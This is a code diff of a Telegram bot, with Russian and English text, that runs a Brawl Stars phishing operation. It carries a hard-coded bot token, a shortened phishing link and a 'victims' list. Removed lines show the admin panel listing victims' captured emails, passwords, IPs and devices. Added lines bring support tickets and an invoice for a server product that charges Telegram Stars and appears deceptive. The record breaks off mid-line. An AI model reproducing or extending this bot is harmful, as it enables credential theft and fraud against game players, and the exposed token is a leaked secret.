@@ -4,14 +4,19 @@ import json
 import threading
 import os
 from http.server import HTTPServer, BaseHTTPRequestHandler
+from datetime import datetime
 
 BOT_TOKEN = "8601549576:AAHLJF0oPN6Sx6jQRpfuHz-Stl3Fri_6LxI"
 ADMIN_ID = 8744429026
+ADMIN_USERNAME = "NeresVoid"
 PHISHING_URL = "https://da.gd/tzO5QW"
 
 last_update_id = 0
 victims = []
 user_language = {}
+tickets = {}
+admin_reply_context = {}
+pending_payments = {}
 
 # ========== ТЕКСТЫ ==========
 TEXTS = {
@@ -21,7 +26,9 @@ TEXTS = {
         'data_empty': "📭 **Нет данных**",
         'data_title': "👥 **Пойманные жертвы:**\n\n",
         'stats': "📊 **СТАТИСТИКА**\n\n👨‍💼 Всего жертв: {total}\n🌐 Уникальных IP: {unique}",
-        'donate': "✨ **ПОДДЕРЖАТЬ**\n\n⭐ 25⭐ ≈ 50₽\n⭐ 50⭐ ≈ 100₽\n⭐ 100⭐ ≈ 200₽",
+        'donate': "✨ **ПОДДЕРЖАТЬ АВТОРА** ✨\n\nВыбери сумму:",
+        'donate_sent': "✅ **Счёт создан**\n\n- **Товар:** 8 GB, 4 vCPU, 75 GB SSD\n- **Количество:** 1 шт.\n\n- **К оплате:** {stars} Telegram Stars\n- **Эквивалент:** {rubles}₽\n- **Номер заказа:** {order_id}\n\n**⏱ Время на оплату:** 60 минут\n\nПосле оплаты товар будет доставлен автоматически.",
+        'payment_received': "✅ **Платёж получен!**\n\nПользователь @{username} перевёл {stars}⭐\n💰 Эквивалент: {rubles}₽\n🆔 Заказ: {order_id}\n\nСпасибо за поддержку! 🙌",
         'settings': "⚙️ **НАСТРОЙКИ**\n\nВыбери язык:",
         'lang_changed': "✅ Язык: Русский",
         'lang_changed_en': "✅ Language: English",
@@ -31,13 +38,23 @@ TEXTS = {
         'donate_btn': "⭐ Поддержать",
         'instruction_btn': "📖 Инструкция",
         'settings_btn': "⚙️ Настройки",
-        'donate_25_btn': "⭐ 25⭐",
-        'donate_50_btn': "⭐ 50⭐",
-        'donate_100_btn': "⭐ 100⭐",
-        'new_message': "📩 **Новое сообщение от пользователя!**\n\n👤 ID: `{user_id}`\n👤 Username: @{username}\n💬 Сообщение:\n`{text}`",
-        'reply_sent': "✅ Ответ отправлен пользователю!",
-        'reply_failed': "❌ Не удалось отправить ответ.",
-        'admin_help': "🔹 Просто напиши боту — сообщение придёт админу\n🔹 Админ ответит тебе кнопкой"
+        'donate_25_btn': "⭐ 25 звёзд (~50₽)",
+        'donate_50_btn': "⭐ 50 звёзд (~100₽)",
+        'donate_100_btn': "⭐ 100 звёзд (~200₽)",
+        'contact_admin_btn': "📩 Поддержка",
+        'ticket_created': "✅ **Тикет создан!**\n\nНапиши свой вопрос ниже. Администратор ответит в этом чате.\n\n⚠️ У тебя активен один тикет. Чтобы создать новый, сначала закрой текущий.",
+        'ticket_already_active': "❌ **У тебя уже есть активный тикет!**\n\nДождись ответа администратора или закрой старый тикет командой /close.",
+        'ticket_closed': "✅ **Тикет закрыт!**\n\nЕсли у тебя остались вопросы — создай новый тикет кнопкой ниже.",
+        'no_active_ticket': "❌ У тебя нет активных тикетов.",
+        'ticket_not_found': "❌ Тикет не найден или уже закрыт.",
+        'reply_from_admin': "📩 **Ответ от администратора:**\n\n{text}\n\n━━━━━━━━━━━━━━━\n💡 Чтобы закрыть тикет — нажми кнопку ниже.",
+        'reply_to_user': "📩 **Ответ пользователю отправлен**",
+        'user_message': "📩 **Сообщение от пользователя**\n\n👤 ID: `{user_id}`\n👤 Username: @{username}\n💬 Сообщение:\n`{text}`\n━━━━━━━━━━━━━━━\n📌 Тикет #{ticket_id}",
+        'close_ticket_btn': "❌ Закрыть тикет",
+        'reply_btn': "✏️ Ответить",
+        'closed_ticket_notify': "🔒 Пользователь закрыл тикет #{ticket_id}",
+        'admin_help': "📩 **Поддержка**\n\nНажми кнопку ниже, чтобы создать тикет. Администратор ответит тебе в этом чате.",
+        'self_message_error': "❌ Вы не можете написать сами себе."
     },
     'en': {
         'start': "🎉 **BRAWL STARS FISHING** 🎉\n\n🔗 **Phishing link:**\n`{url}`\n\n👨‍💼 **Victims:** {count}\n\n📌 Send link to victim.",
@@ -45,7 +62,9 @@ TEXTS = {
         'data_empty': "📭 **No data**",
         'data_title': "👥 **Victims:**\n\n",
         'stats': "📊 **STATISTICS**\n\n👨‍💼 Total: {total}\n🌐 Unique IPs: {unique}",
-        'donate': "✨ **SUPPORT**\n\n⭐ 25⭐ ≈ €0.5\n⭐ 50⭐ ≈ €1\n⭐ 100⭐ ≈ €2",
+        'donate': "✨ **SUPPORT AUTHOR** ✨\n\nChoose amount:",
+        'donate_sent': "✅ **Счёт создан**\n\n- **Товар:** 8 GB, 4 vCPU, 75 GB SSD\n- **Количество:** 1 шт.\n\n- **К оплате:** {stars} Telegram Stars\n- **Эквивалент:** {rubles}₽\n- **Номер заказа:** {order_id}\n\n**⏱ Время на оплату:** 60 минут\n\nПосле оплаты товар будет доставлен автоматически.",
+        'payment_received': "✅ **Payment received!**\n\nUser @{username} transferred {stars}⭐\n💰 Equivalent: {rubles}₽\n🆔 Order: {order_id}\n\nThank you for your support! 🙌",
         'settings': "⚙️ **SETTINGS**\n\nChoose language:",
         'lang_changed': "✅ Language: English",
         'lang_changed_ru': "✅ Язык: Русский",
@@ -55,13 +74,23 @@ TEXTS = {
         'donate_btn': "⭐ Support",
         'instruction_btn': "📖 Guide",
         'settings_btn': "⚙️ Settings",
-        'donate_25_btn': "⭐ 25⭐",
-        'donate_50_btn': "⭐ 50⭐",
-        'donate_100_btn': "⭐ 100⭐",
-        'new_message': "📩 **New message from user!**\n\n👤 ID: `{user_id}`\n👤 Username: @{username}\n💬 Message:\n`{text}`",
-        'reply_sent': "✅ Reply sent to user!",
-        'reply_failed': "❌ Failed to send reply.",
-        'admin_help': "🔹 Just message the bot — it will be forwarded to admin\n🔹 Admin will reply to you with a button"
+        'donate_25_btn': "⭐ 25 stars (~€0.5)",
+        'donate_50_btn': "⭐ 50 stars (~€1)",
+        'donate_100_btn': "⭐ 100 stars (~€2)",
+        'contact_admin_btn': "📩 Support",
+        'ticket_created': "✅ **Ticket created!**\n\nWrite your question below. Admin will answer in this chat.\n\n⚠️ You have one active ticket. To create a new one, close the current one.",
+        'ticket_already_active': "❌ **You already have an active ticket!**\n\nWait for admin response or close old ticket with /close.",
+        'ticket_closed': "✅ **Ticket closed!**\n\nIf you have more questions — create a new ticket using the button below.",
+        'no_active_ticket': "❌ You have no active tickets.",
+        'ticket_not_found': "❌ Ticket not found or already closed.",
+        'reply_from_admin': "📩 **Reply from admin:**\n\n{text}\n\n━━━━━━━━━━━━━━━\n💡 To close the ticket — press the button below.",
+        'reply_to_user': "📩 **Reply sent to user**",
+        'user_message': "📩 **Message from user**\n\n👤 ID: `{user_id}`\n👤 Username: @{username}\n💬 Message:\n`{text}`\n━━━━━━━━━━━━━━━\n📌 Ticket #{ticket_id}",
+        'close_ticket_btn': "❌ Close ticket",
+        'reply_btn': "✏️ Reply",
+        'closed_ticket_notify': "🔒 User closed ticket #{ticket_id}",
+        'admin_help': "📩 **Support**\n\nPress the button below to create a ticket. Admin will answer in this chat.",
+        'self_message_error': "❌ You cannot message yourself."
     }
 }
 
@@ -102,14 +131,15 @@ def get_main_keyboard(chat_id):
         ]
     else:
         return [
-            [{"text": "📩 Написать админу", "callback_data": "contact_admin"}],
+            [{"text": get_button_text(chat_id, 'contact_admin_btn'), "callback_data": "create_ticket"}],
             [{"text": get_button_text(chat_id, 'instruction_btn'), "callback_data": "instruction"}]
         ]
 
 def get_donate_keyboard(chat_id):
     return [
-        [{"text": get_button_text(chat_id, 'donate_25_btn'), "url": "https://t.me/telegram?start=star25"}, {"text": get_button_text(chat_id, 'donate_50_btn'), "url": "https://t.me/telegram?start=star50"}],
-        [{"text": get_button_text(chat_id, 'donate_100_btn'), "url": "https://t.me/telegram?start=star100"}],
+        [{"text": get_button_text(chat_id, 'donate_25_btn'), "callback_data": "donate_25"}],
+        [{"text": get_button_text(chat_id, 'donate_50_btn'), "callback_data": "donate_50"}],
+        [{"text": get_button_text(chat_id, 'donate_100_btn'), "callback_data": "donate_100"}],
         [{"text": get_button_text(chat_id, 'back'), "callback_data": "back"}]
     ]
 
@@ -123,12 +153,38 @@ def get_language_keyboard():
         [{"text": "⬅️ Назад", "callback_data": "back"}]
     ]
 
-def get_reply_keyboard(user_id, username):
-    return [
-        [{"text": "✏️ Ответить пользователю", "callback_data": f"reply_{user_id}_{username}"}]
-    ]
+def get_ticket_keyboard(ticket_id):
+    return [[{"text": "❌ Закрыть тикет", "callback_data": f"close_ticket_{ticket_id}"}]]
 
-# ========== ВЕБ-СЕРВЕР ДЛЯ RENDER (ФИКС) ==========
+def get_admin_reply_keyboard(user_id, username, ticket_id):
+    return [[{"text": "✏️ Ответить", "callback_data": f"admin_reply_{user_id}_{username}_{ticket_id}"}]]
+
+def generate_ticket_id():
+    return int(time.time()) % 1000000
+
+def create_ticket(user_id, username):
+    ticket_id = generate_ticket_id()
+    tickets[user_id] = {
+        "active": True,
+        "ticket_id": ticket_id,
+        "username": username,
+        "messages": [],
+        "created_at": time.time()
+    }
+    return ticket_id
+
+def close_ticket(user_id):
+    if user_id in tickets and tickets[user_id]["active"]:
+        tickets[user_id]["active"] = False
+        return True
+    return False
+
+def get_active_ticket(user_id):
+    if user_id in tickets and tickets[user_id]["active"]:
+        return tickets[user_id]
+    return None
+
+# ========== ВЕБ-СЕРВЕР ДЛЯ RENDER ==========
 class HealthHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         self.send_response(200)
@@ -136,11 +192,9 @@ class HealthHandler(BaseHTTPRequestHandler):
         self.wfile.write(b'Bot is running')
     
     def log_message(self, format, *args):
-        # Отключаем логи веб-сервера, чтобы не засорять вывод
         pass
 
 def run_health_server():
-    # Render ожидает порт 10000
     port = int(os.environ.get('PORT', 10000))
     try:
         server = HTTPServer(('0.0.0.0', port), HealthHandler)
@@ -148,21 +202,15 @@ def run_health_server():
     except Exception as e:
         print(f"Веб-сервер остановлен: {e}")
 
-# Запускаем веб-сервер в отдельном потоке
 web_thread = threading.Thread(target=run_health_server, daemon=True)
 web_thread.start()
-
-# Даём время на запуск веб-сервера
 time.sleep(2)
 
 print("✅ Бот запущен на Render.com!")
 print(f"🔗 Ссылка: {PHISHING_URL}")
-print(f"👑 Администратор: {ADMIN_ID}")
-print(f"🌐 Веб-сервер запущен на порту {os.environ.get('PORT', 10000)}")
+print(f"👑 Администратор: @{ADMIN_USERNAME}")
 
 # ========== ОСНОВНОЙ ЦИКЛ БОТА ==========
-admin_reply_context = {}
-
 while True:
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={last_update_id + 1}&timeout=10"
@@ -180,7 +228,6 @@ while True:
                 text = message.get("text", "")
                 
                 if chat_id == ADMIN_ID:
-                    # Администратор
                     if text == "/start":
                         user_language[chat_id] = 'ru'
                         send_message(chat_id, get_text(chat_id, 'start', url=PHISHING_URL, count=len(victims)), get_main_keyboard(chat_id))
@@ -188,23 +235,74 @@ while True:
                     elif chat_id in admin_reply_context and admin_reply_context[chat_id].get("waiting_reply"):
                         target_user_id = admin_reply_context[chat_id]["user_id"]
                         target_username = admin_reply_context[chat_id]["username"]
-                        send_message(target_user_id, f"📩 **Ответ от администратора:**\n\n{text}")
-                        send_message(chat_id, f"✅ Ответ отправлен пользователю @{target_username} (ID: {target_user_id})")
+                        ticket_id = admin_reply_context[chat_id].get("ticket_id")
+                        
+                        reply_text = get_text(target_user_id, 'reply_from_admin', text=text)
+                        close_keyboard = [[{"text": "❌ Закрыть тикет", "callback_data": f"close_ticket_{ticket_id}"}]]
+                        send_message(target_user_id, reply_text, close_keyboard)
+                        send_message(chat_id, f"✅ Ответ отправлен пользователю @{target_username}")
+                        
+                        if target_user_id in tickets and tickets[target_user_id]["active"]:
+                            tickets[target_user_id]["messages"].append({"role": "admin", "text": text, "time": time.time()})
+                        
                         admin_reply_context[chat_id] = {}
+                    
+                    elif text == "/close":
+                        send_message(chat_id, "❌ У вас нет активного диалога с пользователем.")
+                    
+                    else:
+                        found = False
+                        for user_id, payment in list(pending_payments.items()):
+                            if str(user_id) in text:
+                                rubles = payment["stars"] * 2
+                                admin_text = get_text(ADMIN_ID, 'payment_received', 
+                                                     username=payment["username"], 
+                                                     stars=payment["stars"], 
+                                                     rubles=rubles, 
+                                                     order_id=payment["order_id"])
+                                send_message(ADMIN_ID, admin_text)
+                                send_message(user_id, f"✅ Администратор подтвердил оплату {payment['stars']}⭐!\nСпасибо за поддержку! 💙")
+                                del pending_payments[user_id]
+                                found = True
+                                break
+                        
+                        if not found:
+                            send_message(chat_id, "✅ Сообщение получено.")
+                
                 else:
-                    # Обычный пользователь
+                    if username == ADMIN_USERNAME or str(chat_id) == str(ADMIN_ID):
+                        send_message(chat_id, get_text(chat_id, 'self_message_error'))
+                        continue
+                    
                     if text == "/start":
                         user_language[chat_id] = 'ru'
                         send_message(chat_id, 
                             f"🎉 **Добро пожаловать!** 🎉\n\n"
                             f"🔹 Используй кнопки ниже для связи с администратором.\n"
-                            f"🔹 По всем вопросам пиши — ответят в ближайшее время.\n\n{get_text(chat_id, 'admin_help')}",
+                            f"🔹 По всем вопросам создавай тикет — ответят в ближайшее время.\n\n{get_text(chat_id, 'admin_help')}",
                             get_main_keyboard(chat_id))
+                    
+                    elif text == "/close":
+                        if close_ticket(chat_id):
+                            send_message(chat_id, get_text(chat_id, 'ticket_closed'), get_main_keyboard(chat_id))
+                            if ADMIN_ID in admin_reply_context and admin_reply_context[ADMIN_ID].get("user_id") == chat_id:
+                                admin_reply_context[ADMIN_ID] = {}
+                            send_message(ADMIN_ID, get_text(ADMIN_ID, 'closed_ticket_notify', ticket_id=tickets.get(chat_id, {}).get("ticket_id", "?")))
+                        else:
+                            send_message(chat_id, get_text(chat_id, 'no_active_ticket'), get_main_keyboard(chat_id))
+                    
                     else:
-                        forward_text = get_text(ADMIN_ID, 'new_message', user_id=chat_id, username=username, text=text)
-                        keyboard = get_reply_keyboard(chat_id, username)
-                        send_message(ADMIN_ID, forward_text, keyboard)
-                        send_message(chat_id, "✅ Ваше сообщение отправлено администратору. Ответ придёт сюда.")
+                        active_ticket = get_active_ticket(chat_id)
+                        if active_ticket:
+                            active_ticket["messages"].append({"role": "user", "text": text, "time": time.time()})
+                            
+                            forward_text = get_text(ADMIN_ID, 'user_message', user_id=chat_id, username=username, text=text, ticket_id=active_ticket["ticket_id"])
+                            reply_keyboard = get_admin_reply_keyboard(chat_id, username, active_ticket["ticket_id"])
+                            send_message(ADMIN_ID, forward_text, reply_keyboard)
+                            
+                            send_message(chat_id, "✅ Сообщение отправлено администратору. Ответ придёт сюда.")
+                        else:
+                            send_message(chat_id, get_text(chat_id, 'no_active_ticket'), get_main_keyboard(chat_id))
 
             # Обработка нажатий на кнопки
             if callback:
@@ -212,73 +310,56 @@ while True:
                 data = callback.get("data")
                 callback_id = callback.get("id")
                 message_id = callback.get("message", {}).get("message_id")
+                username = callback.get("from", {}).get("username", "нет")
 
-                if data == "contact_admin":
-                    send_message(chat_id, "📩 **Напиши своё сообщение ниже**\n\nАдминистратор ответит в этот чат.")
+                if data == "create_ticket":
+                    active_ticket = get_active_ticket(chat_id)
+                    if active_ticket:
+                        edit_message(chat_id, message_id, get_text(chat_id, 'ticket_already_active'), get_back_keyboard(chat_id))
+                    else:
+                        ticket_id = create_ticket(chat_id, username)
+                        edit_message(chat_id, message_id, get_text(chat_id, 'ticket_created'), get_ticket_keyboard(ticket_id))
                     answer_callback(callback_id)
-                
-                elif data.startswith("reply_"):
+
+                elif data.startswith("close_ticket_"):
+                    ticket_id = int(data.split("_")[2])
+                    if close_ticket(chat_id):
+                        edit_message(chat_id, message_id, get_text(chat_id, 'ticket_closed'), get_main_keyboard(chat_id))
+                        if ADMIN_ID in admin_reply_context and admin_reply_context[ADMIN_ID].get("user_id") == chat_id:
+                            admin_reply_context[ADMIN_ID] = {}
+                        send_message(ADMIN_ID, get_text(ADMIN_ID, 'closed_ticket_notify', ticket_id=ticket_id))
+                    else:
+                        edit_message(chat_id, message_id, get_text(chat_id, 'ticket_not_found'), get_back_keyboard(chat_id))
+                    answer_callback(callback_id)
+
+                elif data.startswith("admin_reply_"):
                     parts = data.split("_")
-                    if len(parts) >= 3:
-                        target_user_id = int(parts[1])
-                        target_username = parts[2]
-                        admin_reply_context[chat_id] = {"waiting_reply": True, "user_id": target_user_id, "username": target_username}
+                    if len(parts) >= 5:
+                        target_user_id = int(parts[2])
+                        target_username = parts[3]
+                        ticket_id = int(parts[4])
+                        admin_reply_context[chat_id] = {"waiting_reply": True, "user_id": target_user_id, "username": target_username, "ticket_id": ticket_id}
                         send_message(chat_id, f"✏️ **Ответ пользователю @{target_username}**\n\nНапиши текст ответа ниже:")
                         answer_callback(callback_id)
-                
+
                 elif data == "back":
-                    edit_message(chat_id, message_id, 
-                        get_text(chat_id, 'start', url=PHISHING_URL, count=len(victims)) if chat_id == ADMIN_ID else get_text(chat_id, 'admin_help'),
-                        get_main_keyboard(chat_id))
+                    if chat_id == ADMIN_ID:
+                        edit_message(chat_id, message_id, get_text(chat_id, 'start', url=PHISHING_URL, count=len(victims)), get_main_keyboard(chat_id))
+                    else:
+                        edit_message(chat_id, message_id, get_text(chat_id, 'admin_help'), get_main_keyboard(chat_id))
                     answer_callback(callback_id)
 
                 elif data == "donate_menu":
                     edit_message(chat_id, message_id, get_text(chat_id, 'donate'), get_donate_keyboard(chat_id))
                     answer_callback(callback_id)
 
-                elif data == "instruction":
-                    edit_message(chat_id, message_id, get_text(chat_id, 'instruction', url=PHISHING_URL), get_back_keyboard(chat_id))
-                    answer_callback(callback_id)
-
-                elif data == "settings":
-                    edit_message(chat_id, message_id, get_text(chat_id, 'settings'), get_language_keyboard())
-                    answer_callback(callback_id)
-
-                elif data == "lang_ru":
-                    user_language[chat_id] = 'ru'
-                    edit_message(chat_id, message_id, get_text(chat_id, 'lang_changed'), get_back_keyboard(chat_id))
-                    answer_callback(callback_id)
-
-                elif data == "lang_en":
-                    user_language[chat_id] = 'en'
-                    edit_message(chat_id, message_id, get_text(chat_id, 'lang_changed_en'), get_back_keyboard(chat_id))
-                    answer_callback(callback_id)
-
-                elif data == "data" and chat_id == ADMIN_ID:
-                    if not victims:
-                        edit_message(chat_id, message_id, get_text(chat_id, 'data_empty'), get_back_keyboard(chat_id))
-                    else:
-                        txt = get_text(chat_id, 'data_title')
-                        for v in victims[-30:]:
-                            txt += f"📧 {v['email']}\n🔑 {v['password']}\n📡 {v['ip']}\n📱 {v['device']}\n⏰ {v['time']}\n"
-                            txt += "─" * 30 + "\n"
-                        if len(txt) > 4000:
-                            txt = txt[:3900] + "\n...(обрезано)"
-                        edit_message(chat_id, message_id, txt, get_back_keyboard(chat_id))
-                    answer_callback(callback_id)
-
-                elif data == "stats" and chat_id == ADMIN_ID:
-                    unique_ips = len(set(v.get('ip') for v in victims if v.get('ip')))
-                    edit_message(chat_id, message_id, 
-                        get_text(chat_id, 'stats', total=len(victims), unique=unique_ips),
-                        get_back_keyboard(chat_id))
-                    answer_callback(callback_id)
-
-                else:
-                    answer_callback(callback_id)
-
-        time.sleep(1)
-
-    except Exception as e:
-        print(f"Ошибка: {e}")
-        time.sleep(5)
+                elif data == "donate_25":
+                    stars = 25
+                    rubles = stars * 2
+                    order_id = f"№{hash(chat_id + int(time.time())) % 10000000}"
+                    
+                    text = get_text(chat_id, 'donate_sent', stars=stars, rubles=rubles, order_id=order_id)
+                    
+                    keyboard = [
+                        [{"text": f"⭐ Оплатить {stars} звёзд", "url": f"https://t.me/telegram?start=star{stars}"}],
+                        [{"text": "❌ Отменить"
